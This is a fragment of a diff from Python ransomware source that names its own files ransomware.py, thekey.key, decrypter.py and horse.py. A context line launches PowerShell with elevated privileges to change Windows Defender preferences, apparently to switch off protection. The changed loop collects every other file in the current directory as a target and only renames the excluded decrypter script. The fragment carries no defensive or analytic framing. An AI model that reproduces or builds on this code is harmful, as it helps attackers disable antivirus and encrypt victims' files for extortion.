@@ -9,7 +9,7 @@ ctypes.windll.shell32.ShellExecuteW(None, "runas", "powershell", "Set-MpPreferen
 files = []
 
 for file in os.listdir():
-    if file == "ransomware.py" or file == "thekey.key" or file == "unransomware.py" or file == "horse.py":
+    if file == "ransomware.py" or file == "thekey.key" or file == "decrypter.py" or file == "horse.py":
             continue
     if os.path.isfile(file):
           files.append(file)
